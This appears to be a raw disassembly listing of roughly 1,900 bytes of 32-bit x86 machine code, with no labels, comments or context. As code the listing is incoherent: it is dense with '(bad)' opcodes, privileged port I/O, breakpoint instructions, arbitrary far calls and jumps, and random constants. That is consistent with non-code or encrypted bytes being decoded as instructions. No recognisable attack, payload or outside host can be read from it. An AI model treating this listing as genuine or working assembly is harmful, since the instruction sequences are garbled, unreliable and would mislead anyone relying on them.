  417c1c:	aaa    
  417c1d:	adc    edi,DWORD PTR [esi+edx*4+0x4d3a8e41]
  417c24:	and    eax,0x4cbedd25
  417c29:	add    DWORD PTR [ebx-0x4801c5a7],eax
  417c2f:	cli    
  417c30:	shl    DWORD PTR [ebx],cl
  417c32:	fcmovnu st,st(1)
  417c34:	sbb    esi,DWORD PTR [esp+esi*4]
  417c37:	or     al,0xbd
  417c39:	pop    eax
  417c3a:	cmp    eax,0x54b671be
  417c3f:	icebp  
  417c40:	lds    edi,FWORD PTR [edi+0x1f6e8dd0]
  417c46:	xlat   BYTE PTR ds:[ebx]
  417c47:	xchg   bh,al
  417c49:	push   edi
  417c4a:	aam    0x1f
  417c4c:	push   ebp
  417c4d:	mov    gs,WORD PTR [ebx+eiz*4]
  417c50:	int3   
  417c51:	fst    st(7)
  417c53:	(bad)  
  417c54:	push   ss
  417c55:	test   al,0xf1
  417c57:	sub    ebp,DWORD PTR [edx-0x680d5d68]
  417c5d:	popa   
  417c5e:	adc    DWORD PTR [ecx+esi*2+0x388400df],ecx
  417c65:	shl    esi,cl
  417c67:	sbb    DWORD PTR [ecx+0x2],esi
  417c6a:	mov    esi,eax
  417c6c:	sti    
  417c6d:	pop    ecx
  417c6e:	aam    0x6b
  417c70:	mov    edx,0x472befe5
  417c75:	icebp  
  417c76:	cmp    DWORD PTR [esp+0x55],ebp
  417c7a:	std    
  417c7b:	out    0xa6,al
  417c7d:	shl    BYTE PTR [esi],cl
  417c7f:	ins    BYTE PTR es:[edi],dx
  417c80:	loope  0x417c57
  417c82:	pop    esi
  417c83:	or     BYTE PTR [edx-0x5f],al
  417c86:	pop    edi
  417c87:	push   ebx
  417c88:	jmp    0x417c42
  417c8a:	pushf  
  417c8b:	imul   esi,DWORD PTR [esi+0x14],0xeb768c
  417c92:	mov    ch,BYTE PTR [ebx]
  417c94:	in     al,0xc1
  417c96:	out    0xe4,eax
  417c98:	sub    eax,0xa9a5bb8c
  417c9d:	aas    
  417c9e:	ret    0x9c1a
  417ca1:	cmp    eax,ebp
  417ca3:	arpl   WORD PTR [edi],ax
  417ca5:	xor    cl,BYTE PTR [edx+edx*8+0x4c]
  417ca9:	jne    0x417cca
  417cab:	mov    ebx,0x559c13aa
  417cb0:	out    0x9c,al
  417cb2:	loope  0x417d02
  417cb4:	push   edx
  417cb5:	(bad)  
  417cb6:	mov    ecx,0xc6b0cb39
  417cbb:	and    DWORD PTR [edi+eax*2-0x3d],esi
  417cbf:	pop    esp
  417cc0:	ror    esp,0x30
  417cc3:	aad    0xbe
  417cc5:	sub    al,0xa1
  417cc7:	mov    eax,0x9ec75833
  417ccc:	add    BYTE PTR [ebx-0x25],dh
  417ccf:	es mov edx,ebp
  417cd2:	add    ebp,DWORD PTR [ecx+0x65]
  417cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cd7:	xor    bh,BYTE PTR [ebx]
  417cd9:	xchg   esp,eax
  417cda:	(bad)  
  417cdc:	imul   ebx,ebp,0x51e3aa53
  417ce2:	(bad)  
  417ce3:	and    BYTE PTR [edi-0x49],bh
  417ce6:	adc    al,0x99
  417ce8:	xchg   bl,ch
  417cea:	repnz std 
  417cec:	cli    
  417ced:	bound  ebp,QWORD PTR cs:[ebp-0x3432fee6]
  417cf4:	inc    esi
  417cf5:	sbb    bh,BYTE PTR [ebx+0x4b]
  417cf8:	inc    ebx
  417cf9:	jb     0x417cda
  417cfb:	fabs   
  417cfd:	dec    ebx
  417cfe:	stos   DWORD PTR es:[edi],eax
  417cff:	fwait
  417d00:	shl    DWORD PTR [edx+ebp*4],0x54
  417d04:	(bad)  
  417d05:	shr    cl,0x9e
  417d08:	mov    esp,0x62e819e6
  417d0d:	stc    
  417d0e:	lea    ecx,[eax+0x1f2508d4]
  417d14:	repz (bad) 
  417d16:	(bad)  
  417d18:	mov    bl,0xce
  417d1a:	adc    BYTE PTR [ebx+0x11e4940f],bh
  417d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d21:	push   0x5ab5241c
  417d26:	adc    eax,0x15e32031
  417d2b:	mov    WORD PTR [edi-0x582a1616],ds
  417d31:	arpl   WORD PTR [esp+ebp*2-0x36906ea8],si
  417d38:	(bad)  
  417d39:	repnz xor DWORD PTR [edx-0x3c],eax
  417d3d:	jmp    0x417da1
  417d3f:	pushf  
  417d40:	dec    esi
  417d41:	stos   DWORD PTR es:[edi],eax
  417d42:	mov    esi,0xad37651d
  417d47:	jmp    0x417db3
  417d49:	jmp    0x8590f7ae
  417d4e:	cdq    
  417d4f:	cli    
  417d50:	imul   edx,DWORD PTR [edi],0xffffffb2
  417d53:	iret   
  417d54:	dec    eax
  417d55:	xchg   esp,eax
  417d56:	pushf  
  417d57:	pop    ebp
  417d58:	push   cs
  417d59:	or     DWORD PTR [ecx-0x742a076b],ebx
  417d5f:	push   edi
  417d60:	push   ebp
  417d61:	or     eax,0xebd588d1
  417d66:	mov    cl,0x53
  417d68:	pusha  
  417d69:	adc    DWORD PTR [ecx],esi
  417d6b:	stc    
  417d6c:	test   eax,0x93355dc3
  417d71:	pop    ebp
  417d72:	(bad)  
  417d73:	imul   edx,DWORD PTR [ecx],0xffffffcd
  417d76:	int    0x62
  417d78:	jg     0x417dcb
  417d7a:	lahf   
  417d7b:	daa    
  417d7c:	pop    ebx
  417d7d:	and    bl,BYTE PTR [edx]
  417d7f:	xchg   ebp,eax
  417d80:	fldcw  WORD PTR [ebx-0x5178ec04]
  417d86:	sahf   
  417d87:	pop    ss
  417d88:	jecxz  0x417d62
  417d8a:	push   eax
  417d8b:	daa    
  417d8c:	stos   BYTE PTR es:[edi],al
  417d8d:	clc    
  417d8e:	pop    ebp
  417d8f:	xchg   ebp,eax
  417d90:	mov    edx,0xbdb67c3d
  417d95:	or     eax,0x31acb2c2
  417d9a:	lods   al,BYTE PTR ds:[esi]
  417d9b:	push   eax
  417d9c:	ret    0x7f70
  417d9f:	xlat   BYTE PTR ds:[ebx]
  417da0:	dec    esi
  417da1:	scas   eax,DWORD PTR es:[edi]
  417da2:	mov    ebx,0xfc8293f4
  417da7:	add    eax,0x11c8e0b4
  417dac:	xchg   edi,eax
  417dad:	stc    
  417dae:	arpl   sp,bx
  417db0:	data16 je 0x417d3e
  417db3:	adc    al,0x62
  417db5:	jge    0x417ddb
  417db7:	sub    DWORD PTR [edi],0x1b
  417dba:	int    0x40
  417dbc:	sub    eax,0x93b3fe6c
  417dc1:	pusha  
  417dc2:	or     al,0x89
  417dc4:	cmp    bl,ch
  417dc6:	dec    edi
  417dc7:	xlat   BYTE PTR ds:[ebx]
  417dc8:	add    BYTE PTR [ecx],bh
  417dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dcb:	fisubr DWORD PTR [edx+0x79]
  417dce:	or     eax,0x76897879
  417dd3:	sar    BYTE PTR [edx+0x55],cl
  417dd6:	or     BYTE PTR [ebx],0x73
  417dd9:	sbb    BYTE PTR [ecx-0x79],0xdf
  417ddd:	call   0x1ab12404
  417de2:	jne    0x417dbe
  417de4:	stos   DWORD PTR es:[edi],eax
  417de5:	std    
  417de6:	lods   al,BYTE PTR ds:[esi]
  417de7:	popf   
  417de8:	jbe    0x417d7c
  417dea:	les    edx,FWORD PTR [ebx]
  417dec:	adc    BYTE PTR [ecx+0x4d626231],cl
  417df2:	fidivr WORD PTR [esi]
  417df4:	jecxz  0x417ddb
  417df6:	loopne 0x417dc6
  417df8:	icebp  
  417df9:	push   eax
  417dfa:	adc    al,0x15
  417dfc:	das    
  417dfd:	and    DWORD PTR [esi],esp
  417dff:	jne    0x417db0
  417e01:	lahf   
  417e02:	cmp    BYTE PTR [eax-0x13],cl
  417e05:	fist   WORD PTR [ebp-0x20]
  417e08:	(bad)  
  417e0a:	inc    esp
  417e0b:	mov    esi,0x3b02d6a5
  417e10:	xor    ecx,esp
  417e12:	push   0x679f2cf7
  417e17:	mov    edx,0x1fa2e550
  417e1c:	sub    BYTE PTR [edi+0x465b0b6],bh
  417e22:	fnstenv [ebx+0x5c79057c]
  417e28:	(bad)  
  417e29:	ffreep st(0)
  417e2b:	jecxz  0x417ddb
  417e2d:	xchg   ebx,edx
  417e2f:	out    0x33,al
  417e31:	and    eax,0x6bee18e1
  417e36:	inc    ebx
  417e37:	jecxz  0x417eb5
  417e39:	repnz cmp ebp,eax
  417e3c:	jg     0x417dec
  417e3e:	daa    
  417e3f:	outs   dx,BYTE PTR ds:[esi]
  417e40:	popa   
  417e41:	add    esp,0xc0cbe434
  417e47:	xor    BYTE PTR [edi-0x51],dh
  417e4a:	cmp    BYTE PTR [ecx-0x67],0xe9
  417e4e:	cmp    al,cl
  417e50:	sbb    al,0x42
  417e52:	pop    es
  417e53:	push   0xc48e9815
  417e58:	sub    esi,DWORD PTR [ebx-0x78b959cc]
  417e5e:	outs   dx,DWORD PTR ds:[esi]
  417e5f:	push   esp
  417e60:	ja     0x417df1
  417e62:	dec    ecx
  417e63:	enter  0x8b9c,0x51
  417e67:	daa    
  417e68:	xchg   edx,eax
  417e69:	aad    0xc1
  417e6b:	call   0x7d1d:0x97435bd1
  417e72:	inc    edx
  417e73:	jp     0x417e4d
  417e75:	xlat   BYTE PTR ds:[ebx]
  417e76:	pusha  
  417e77:	int3   
  417e78:	add    BYTE PTR [ebx+0x3c2cc38b],dl
  417e7e:	fcmovu st,st(2)
  417e80:	loop   0x417f00
  417e82:	test   al,0xb4
  417e84:	add    al,0x12
  417e86:	push   ds
  417e87:	push   ss
  417e88:	repnz adc al,BYTE PTR [edx]
  417e8b:	cmp    BYTE PTR [eax],al
  417e8d:	aam    0x23
  417e8f:	std    
  417e90:	ds js  0x417e94
  417e93:	leave  
  417e94:	sbb    DWORD PTR [ebp-0x5608ddc2],0x9e3f53a4
  417e9e:	leave  
  417e9f:	dec    eax
  417ea0:	inc    edx
  417ea1:	mov    bl,0xed
  417ea3:	sub    BYTE PTR [ebx-0x6d],bh
  417ea6:	and    BYTE PTR [eax],bl
  417ea8:	add    al,0xae
  417eaa:	(bad)
  417ead:	jb     0x417f2e
  417eaf:	push   ebp
  417eb0:	popa   
  417eb1:	out    dx,eax
  417eb2:	ja     0x417ef5
  417eb4:	ror    ah,0x13
  417eb7:	adc    al,0x9e
  417eb9:	xchg   esi,eax
  417eba:	push   cs
  417ebb:	push   0x4e
  417ebd:	adc    BYTE PTR [edi-0x13cc260d],0x52
  417ec4:	rcl    BYTE PTR [eax-0x31],1
  417ec7:	cmp    eax,0x90bfbee1
  417ecc:	xor    al,BYTE PTR ds:0xd343fd44
  417ed2:	adc    ch,BYTE PTR [edx-0x4efb7af]
  417ed8:	xor    BYTE PTR [ebp-0x6e],dh
  417edb:	push   DWORD PTR [ebp+0x10]
  417ede:	test   DWORD PTR [eax-0x59570084],eax
  417ee4:	mov    bh,0x22
  417ee6:	sbb    eax,0xf7c66a35
  417eeb:	jmp    0x417e9d
  417eed:	jge    0x417f0d
  417eef:	jae    0x417ecf
  417ef1:	pop    eax
  417ef2:	adc    al,0x20
  417ef4:	and    eax,0x12b33591
  417ef9:	cmc    
  417efa:	xor    al,0xf
  417efc:	and    dl,BYTE PTR [esi-0x2ca42e8f]
  417f02:	inc    esp
  417f03:	xor    BYTE PTR [ecx],ch
  417f05:	sahf   
  417f06:	dec    eax
  417f07:	stos   DWORD PTR es:[edi],eax
  417f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f09:	pop    esp
  417f0a:	pop    edi
  417f0b:	mov    ecx,DWORD PTR [edi+0x1cd12e97]
  417f11:	pop    ebp
  417f12:	call   0xe0776e7c
  417f17:	outs   dx,BYTE PTR ds:[esi]
  417f18:	pop    es
  417f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f1a:	and    BYTE PTR [edx+0x62],dh
  417f1d:	sahf   
  417f1e:	adc    DWORD PTR [esi],edi
  417f20:	ret    0x8a9a
  417f23:	xlat   BYTE PTR ds:[ebx]
  417f24:	rcl    BYTE PTR [ebp+0x46],0xbc
  417f28:	test   DWORD PTR [eax],edx
  417f2a:	dec    esi
  417f2b:	mov    al,ds:0xa040fe3c
  417f30:	add    DWORD PTR [edx],ecx
  417f32:	(bad)  
  417f33:	and    dh,BYTE PTR fs:[edi-0x197ee931]
  417f3a:	into   
  417f3b:	jg     0x417ef5
  417f3d:	jb     0x417f25
  417f3f:	mov    bh,0x0
  417f41:	dec    BYTE PTR [ecx+edx*2-0x17927056]
  417f48:	mov    bl,0x36
  417f4a:	inc    edi
  417f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4c:	adc    DWORD PTR [ecx],edi
  417f4e:	jl     0x417f93
  417f50:	enter  0x20ed,0xfe
  417f54:	sar    esp,1
  417f56:	lock add al,BYTE PTR [edi+0x1d56bff8]
  417f5d:	xor    esi,DWORD PTR [ebx-0x14]
  417f60:	adc    BYTE PTR [ebp-0x1f],dh
  417f63:	cli    
  417f64:	xchg   ebp,eax
  417f65:	ja     0x417f34
  417f67:	inc    edi
  417f68:	mov    ds:0x7273564c,al
  417f6d:	inc    ebx
  417f6e:	mov    cl,0x80
  417f70:	ins    BYTE PTR es:[edi],dx
  417f71:	hlt    
  417f72:	jp     0x417f2c
  417f74:	out    0xd8,al
  417f76:	cmc    
  417f77:	pop    ds
  417f78:	(bad)  
  417f79:	push   esi
  417f7a:	mov    edx,0x1a88700e
  417f7f:	loope  0x417f68
  417f81:	popf   
  417f82:	add    eax,0x8512e3e7
  417f87:	ja     0x417f86
  417f89:	jno    0x417fae
  417f8b:	sti    
  417f8c:	outs   dx,BYTE PTR ds:[esi]
  417f8d:	push   esi
  417f8e:	ja     0x417f44
  417f90:	mov    ebp,0xf27ee851
  417f95:	push   ds
  417f96:	adc    eax,0xde15c040
  417f9b:	scas   al,BYTE PTR es:[edi]
  417f9c:	xor    cl,dl
  417f9e:	xchg   edx,eax
  417f9f:	call   0x22ff:0x6d39d46d
  417fa6:	xor    al,0x21
  417fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa9:	push   0x7a
  417fab:	cmp    dl,dl
  417fad:	push   ss
  417fae:	push   ds
  417faf:	and    BYTE PTR [edx-0x29856367],0x99
  417fb6:	xor    ecx,DWORD PTR [ecx+eiz*2-0x11333d00]
  417fbd:	les    ebx,FWORD PTR [eax]
  417fbf:	mov    al,ds:0x556e758f
  417fc4:	test   al,0x9
  417fc6:	xor    BYTE PTR ds:0xc628cc13,al
  417fcc:	pop    edx
  417fcd:	sar    ebx,1
  417fcf:	xlat   BYTE PTR ds:[ebx]
  417fd0:	sbb    DWORD PTR [ecx-0x5e],0x2c0686aa
  417fd7:	std    
  417fd8:	mov    dl,0xf2
  417fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fdb:	sbb    ah,BYTE PTR [ebx]
  417fdd:	inc    edi
  417fde:	inc    esp
  417fdf:	sub    bl,BYTE PTR [edx-0x6a870cf4]
  417fe5:	xchg   ebp,eax
  417fe6:	loopne 0x417f9d
  417fe8:	cmp    esi,ecx
  417fea:	inc    ebp
  417feb:	ins    DWORD PTR es:[edi],dx
  417fec:	fiadd  WORD PTR [eax-0x38c2d0c4]
  417ff2:	out    0x19,al
  417ff4:	xchg   DWORD PTR [ebx+0x64],esp
  417ff7:	in     al,dx
  417ff8:	stos   DWORD PTR es:[edi],eax
  417ff9:	cmp    esi,ecx
  417ffb:	in     al,dx
  417ffc:	cmp    ebx,DWORD PTR ds:0xa0d7580d
  418002:	push   esi
  418003:	mov    edx,0x3f26cd5c
  418008:	jnp    0x417fa5
  41800a:	xlat   BYTE PTR ds:[ebx]
  41800b:	xor    eax,0xcaca9792
  418010:	les    esi,FWORD PTR [ebp-0xd]
  418013:	vpaddq ymm5,ymm1,YMMWORD PTR [edx]
  418017:	push   ebp
  418018:	pop    edx
  418019:	ins    BYTE PTR es:[edi],dx
  41801a:	lahf   
  41801b:	pushf  
  41801c:	int    0xa9
  41801e:	in     eax,dx
  41801f:	sbb    al,0x75
  418021:	and    ebx,DWORD PTR [eax-0x3e624ed2]
  418027:	adc    al,0xd8
  418029:	sbb    al,0x97
  41802b:	ds nop
  41802d:	lea    edi,[edx-0x3051a500]
  418033:	mov    cl,BYTE PTR [ebx-0x19ee3976]
  418039:	pop    edx
  41803a:	jge    0x41801e
  41803c:	add    eax,0xb0f67ac0
  418041:	loop   0x417fcf
  418043:	ins    DWORD PTR es:[edi],dx
  418044:	and    eax,0x83fcdbc1
  418049:	push   eax
  41804a:	jge    0x41802f
  41804c:	xchg   BYTE PTR [eax-0x6d703b45],cl
  418052:	mov    ds:0x46593394,eax
  418057:	aam    0x1e
  418059:	ins    BYTE PTR es:[edi],dx
  41805a:	outs   dx,BYTE PTR ds:[esi]
  41805b:	dec    ebp
  41805c:	sbb    ch,BYTE PTR ds:0x45caeed8
  418062:	ins    DWORD PTR es:[edi],dx
  418063:	cli    
  418064:	add    bl,dl
  418066:	lahf   
  418067:	jb     0x418079
  418069:	scas   eax,DWORD PTR es:[edi]
  41806a:	pop    es
  41806b:	fidivr DWORD PTR [ebp+0x32719bc1]
  418071:	mov    BYTE PTR [edi+0x1cca4a59],ah
  418077:	pop    esi
  418078:	call   0x5110:0xfbb87e00
  41807f:	into   
  418080:	aad    0xcf
  418082:	cmp    BYTE PTR [ebp+0x586fc404],bl
  418088:	call   0x168224de
  41808d:	mov    si,0x8d2e
  418091:	sub    eax,0x3b964397
  418096:	xchg   esi,eax
  418097:	retf   
  418098:	in     al,dx
  418099:	call   0xa328:0x1e1f7e85
  4180a0:	bound  ecx,QWORD PTR [ecx+0x25ca82cb]
  4180a6:	arpl   WORD PTR [ecx],si
  4180a8:	ins    BYTE PTR es:[edi],dx
  4180a9:	stc    
  4180aa:	or     cl,bh
  4180ac:	cmc    
  4180ad:	jmp    0x4180ee
  4180af:	pop    edi
  4180b0:	fs push ss
  4180b2:	lds    edx,FWORD PTR [ebp+0x200b06fb]
  4180b8:	outs   dx,BYTE PTR ds:[esi]
  4180b9:	rcr    BYTE PTR [edi],0x87
  4180bc:	inc    edi
  4180bd:	call   0xe00c:0xeacb4aa4
  4180c4:	xchg   ebp,eax
  4180c5:	and    dh,BYTE PTR [esi-0x5c]
  4180c8:	push   0xffffffc6
  4180ca:	ja     0x418126
  4180cc:	push   cs
  4180cd:	sub    ah,BYTE PTR [ebp+ebp*1+0x48]
  4180d1:	sbb    BYTE PTR [eax],0xdb
  4180d4:	jle    0x418146
  4180d6:	cmp    DWORD PTR [edi+0x45],ebx
  4180d9:	pop    esi
  4180da:	imul   esi,edx,0x709a37c6
  4180e0:	mov    cl,0xb5
  4180e2:	lods   al,BYTE PTR ds:[esi]
  4180e3:	add    ch,BYTE PTR [esp+edi*2]
  4180e6:	xor    DWORD PTR [ebx],ebp
  4180e8:	jle    0x418145
  4180ea:	pop    es
  4180eb:	adc    edi,DWORD PTR [ecx-0x16d02cde]
  4180f1:	fst    QWORD PTR [esi-0x51]
  4180f4:	jb     0x418174
  4180f6:	sub    esp,DWORD PTR [edi-0x4246ba12]
  4180fc:	push   cs
  4180fd:	and    BYTE PTR [esi],bl
  4180ff:	data16 test BYTE PTR [ebx+edi*1+0x422456e],dh
  418107:	lock mov eax,0xca466709
  41810d:	and    eax,0x45aa12cd
  418112:	adc    BYTE PTR [eax-0x6258dfd4],ah
  418118:	push   esp
  418119:	and    DWORD PTR [ebx+ebx*8],eax
  41811c:	outs   dx,BYTE PTR ds:[esi]
  41811d:	push   edi
  41811e:	mov    ah,0x4b
  418120:	pop    ebx
  418121:	xor    BYTE PTR [ecx-0x38c2e387],bl
  418127:	(bad)  
  418129:	scas   al,BYTE PTR es:[edi]
  41812a:	mov    esi,0x3dbdca44
  41812f:	jge    0x4180eb
  418131:	imul   esi,DWORD PTR [ebp-0x65],0xc
  418135:	dec    ecx
  418136:	ins    BYTE PTR es:[edi],dx
  418137:	and    eax,0xb4215857
  41813c:	popf   
  41813d:	pop    eax
  41813e:	push   edi
  41813f:	lahf   
  418140:	fsubr  DWORD PTR [esi+0x26]
  418143:	mov    edx,0xab1b9f21
  418148:	push   eax
  418149:	fdiv   QWORD PTR [ecx]
  41814b:	loop   0x418166
  41814d:	cmp    eax,0xe59fe0af
  418152:	mov    ds:0x6436e4a5,eax
  418157:	or     BYTE PTR [ebx*1+0xfd04120],dl
  41815e:	and    bh,BYTE PTR [ebp+0x1f92183d]
  418164:	xchg   ecx,eax
  418165:	mov    al,ds:0x35534a6e
  41816a:	mov    ebx,0x779bd7dc
  41816f:	push   esi
  418170:	jno    0x4181a0
  418172:	fwait
  418173:	sub    eax,0x1141397d
  418178:	mov    ah,dl
  41817a:	push   ecx
  41817b:	sbb    BYTE PTR [ebx],dh
  41817d:	mov    bl,0xa5
  41817f:	stos   DWORD PTR es:[edi],eax
  418180:	inc    BYTE PTR [eax-0x5b]
  418183:	xor    dl,bh
  418185:	gs addr16 push 0x3
  418189:	iret   
  41818a:	ins    BYTE PTR es:[edi],dx
  41818b:	shl    ebp,cl
  41818d:	std    
  41818e:	jns    0x418204
  418190:	and    al,0xfe
  418192:	push   ebx
  418193:	and    BYTE PTR ds:[ebp+0x77009174],cl
  41819a:	sub    DWORD PTR [eax+ebp*8],ecx
  41819d:	into   
  41819e:	or     BYTE PTR [edx+0x72f5e2a7],ah
  4181a4:	imul   ebp,DWORD PTR [ebp+0x3c],0xffffff9f
  4181a8:	sbb    eax,DWORD PTR [ecx+0x24]
  4181ab:	movq   mm5,mm0
  4181ae:	and    DWORD PTR [edi-0x60],eax
  4181b1:	fmulp  st(2),st
  4181b3:	xchg   ecx,eax
  4181b4:	cmp    DWORD PTR [edx+0x7ffc7720],0xffffff9e
  4181bb:	add    eax,0xba220558
  4181c0:	shr    DWORD PTR [esi-0x3ea05fcb],0xda
  4181c7:	or     al,0x80
  4181c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181ca:	bound  esp,QWORD PTR [eax+0x2c577db7]
  4181d0:	push   ecx
  4181d1:	jmp    0x8d87:0x6cc1a59c
  4181d8:	sbb    eax,0x5ee32c47
  4181dd:	mov    ds:0x3bf325d0,al
  4181e2:	movq   QWORD PTR [edx],mm4
  4181e5:	inc    esi
  4181e6:	aam    0x5b
  4181e8:	lods   al,BYTE PTR ds:[esi]
  4181e9:	add    BYTE PTR [eax+0x18],dl
  4181ec:	retf   
  4181ed:	mov    edi,0x68cd32e
  4181f2:	lods   al,BYTE PTR ds:[esi]
  4181f3:	jo     0x41826d
  4181f5:	rcr    BYTE PTR [ebx],1
  4181f7:	mov    ebx,0x7ce695cc
  4181fc:	mov    dh,bl
  4181fe:	stos   BYTE PTR es:[edi],al
  4181ff:	ss jge 0x41820e
  418202:	ds test al,0x65
  418205:	out    dx,al
  418206:	pop    edi
  418207:	xor    ah,BYTE PTR [esi-0x7aa19147]
  41820d:	outs   dx,DWORD PTR ds:[esi]
  41820e:	or     eax,0x4e4febe2
  418213:	in     eax,dx
  418214:	push   esp
  418215:	adc    ebx,DWORD PTR [edi]
  418217:	inc    ebx
  418218:	adc    eax,0x581c966d
  41821d:	add    edi,edi
  41821f:	ins    DWORD PTR es:[edi],dx
  418220:	push   esi
  418221:	bound  edi,QWORD PTR [edi-0x21]
  418224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418225:	adc    eax,0x5b7e410
  41822a:	fld    QWORD PTR [ebx+0x61333329]
  418230:	mov    eax,0x4950de1e
  418235:	into   
  418236:	popf   
  418237:	push   0x33
  418239:	imul   edi,DWORD PTR [ebx-0x73],0xffffffc5
  41823d:	mov    eax,0xa7dc67c0
  418242:	retf   
  418243:	push   ecx
  418244:	inc    ecx
  418245:	push   ebx
  418246:	ins    BYTE PTR es:[di],dx
  418248:	and    eax,DWORD PTR [esi+0x2d]
  41824b:	adc    esi,esp
  41824d:	minps  xmm3,XMMWORD PTR [edx-0x10]
  418251:	xchg   edi,eax
  418252:	mov    ch,0xe2
  418254:	shr    BYTE PTR [ebx-0x5],cl
  418257:	jne    0x41822f
  418259:	inc    edi
  41825a:	push   ebp
  41825b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41825c:	mov    eax,ds:0xf12262c
  418261:	je     0x41827f
  418263:	or     bh,cl
  418265:	sar    DWORD PTR [edx+0x150215b8],cl
  41826b:	or     al,ah
  41826d:	mov    cl,0xa9
  41826f:	imul   esp,DWORD PTR [eax-0x1f],0x3
  418273:	out    dx,eax
  418274:	and    al,0x30
  418276:	dec    ebx
  418277:	enter  0x172c,0x36
  41827b:	xchg   DWORD PTR [ebx],esp
  41827d:	retf   0x6931
  418280:	into   
  418281:	mov    eax,0xb0c8548
  418286:	push   ss
  418287:	iret   
  418288:	les    edi,FWORD PTR [ebx+0x60f584ad]
  41828e:	ror    BYTE PTR [esi+0x336e2338],cl
  418294:	sub    BYTE PTR [ebx-0x19],cl
  418297:	mov    ds:0x7abb1340,eax
  41829c:	retf   0xcef9
  41829f:	jg     0x418242
  4182a1:	aam    0xf7
  4182a3:	imul   ebx,DWORD PTR [ebx-0xd618fe3],0x43f98f3b
  4182ad:	xor    esi,edx
  4182af:	shl    ebx,0xc9
  4182b2:	push   ebp
  4182b3:	dec    edx
  4182b4:	push   ds
  4182b5:	jl     0x4182de
  4182b7:	dec    esp
  4182b8:	stc    
  4182b9:	ficomp DWORD PTR [ebx-0xa]
  4182bc:	mov    bh,0x1f
  4182be:	mov    ch,0xf5
  4182c0:	pop    ecx
  4182c1:	jb     0x4182bf
  4182c3:	je     0x418329
  4182c5:	mov    ebp,?
  4182c7:	pop    eax
  4182c8:	xchg   ebx,eax
  4182c9:	xchg   DWORD PTR [eax+0x36646510],edx
  4182cf:	aam    0xf
  4182d1:	in     eax,dx
  4182d2:	retf   0xd09a
  4182d5:	pop    es
  4182d6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4182d8:	ror    BYTE PTR [esp+ecx*1-0x73],1
  4182dc:	pushf  
  4182dd:	sahf   
  4182de:	xchg   DWORD PTR [eax-0xa045604],edx
  4182e4:	and    eax,0x1bd769b6
  4182e9:	inc    ebx
  4182ea:	dec    ebx
  4182eb:	jo     0x418304
  4182ed:	xchg   edi,eax
  4182ee:	lds    ebx,FWORD PTR [ebx-0xfc84cd8]
  4182f4:	jo     0x4182af
  4182f6:	sbb    al,0x76
  4182f8:	sar    BYTE PTR [ebx],cl
  4182fa:	cmp    ebx,0xffffffa3
  4182fd:	pop    ss
  4182fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418300:	popf   
  418301:	jno    0x41833b
  418303:	add    BYTE PTR [ecx-0x63],dh
  418306:	lds    edi,FWORD PTR [eax-0x71]
  418309:	cmp    al,0x43
  41830b:	add    bh,bh
  41830d:	lds    ebp,FWORD PTR [edx-0x42]
  418310:	pusha  
  418311:	jg     0x4182f7
  418313:	pop    ebx
  418314:	and    BYTE PTR [ebp+0x16ee0e0c],dl
  41831a:	icebp  
  41831b:	pop    ebx
  41831c:	fst    DWORD PTR [ecx+0x5e]
  41831f:	or     BYTE PTR [esi],dh
  418321:	test   al,0x6a
  418323:	ds into 
  418325:	data16 sahf 
  418327:	xor    ebx,DWORD PTR [esi+0x58]
  41832a:	pop    ebx
  41832b:	push   ebx
  41832c:	sbb    BYTE PTR [ebp+0x2c2c0a34],dh
  418332:	inc    eax
  418333:	push   ebx
  418334:	ror    BYTE PTR [edi-0x60],1
  418337:	adc    ah,BYTE PTR [ebp+0x4c6f87bd]
  41833d:	ins    DWORD PTR es:[edi],dx
  41833e:	ror    BYTE PTR [eax-0x4e],0x3d
  418342:	adc    eax,0x9d4c2d63
  418347:	and    BYTE PTR [eax+edi*8+0x4fedddb8],0xe7
  41834f:	cmp    DWORD PTR [edx],ecx
  418351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418352:	pop    esi
  418353:	mov    al,0xe6
  418355:	xor    BYTE PTR ds:0xe06cd77c,ah
  41835b:	test   al,0x53
  41835d:	(bad)  
  41835e:	jp     0x418310
  418360:	inc    eax
  418361:	xor    edx,eax
  418363:	mov    bh,0x7f
  418365:	fild   QWORD PTR [ebx]
  418367:	mov    esi,0xf86e204a
  41836c:	(bad)  
  41836d:	stos   BYTE PTR es:[edi],al
  41836e:	push   ds
  41836f:	or     ah,BYTE PTR [esi-0x7424182b]
  418375:	stos   DWORD PTR es:[edi],eax
  418376:	push   es
  418377:	xchg   esp,eax
  418378:	out    0x76,eax
  41837a:	sar    ah,1
  41837c:	mov    eax,0xead87334
  418381:	fistp  WORD PTR [edx+0x5767c823]
  418387:	out    dx,al
  418388:	inc    edx
  418389:	in     al,dx
  41838a:	(bad)  
  41838b:	in     eax,dx
  41838c:	add    DWORD PTR [edx],esp
  41838e:	ds aas 
  418390:	ror    DWORD PTR [edi+0x1d053f45],1
  418396:	xlat   BYTE PTR ds:[ebx]
  418397:	fsubr  st(4),st
  418399:	mov    cl,0x4a
  41839b:	and    DWORD PTR [edi+0x50],esi
  41839e:	test   eax,0xfc648bc0
  4183a3:	sub    ebx,eax
  4183a5:	iret   
  4183a6:	adc    ebx,DWORD PTR [ebx+0x15]
  4183a9:	fcomp  DWORD PTR [esi-0x143ce5e7]
  4183af:	pop    edx
  4183b0:	int    0xb4
  4183b2:	popf   
  4183b3:	push   cs
  4183b4:	leave  
  4183b5:	or     al,0x13
  4183b7:	cmc    
  4183b8:	jno    0x418347
  4183ba:	imul   ebx,DWORD PTR ss:[ebx],0xffffffb6
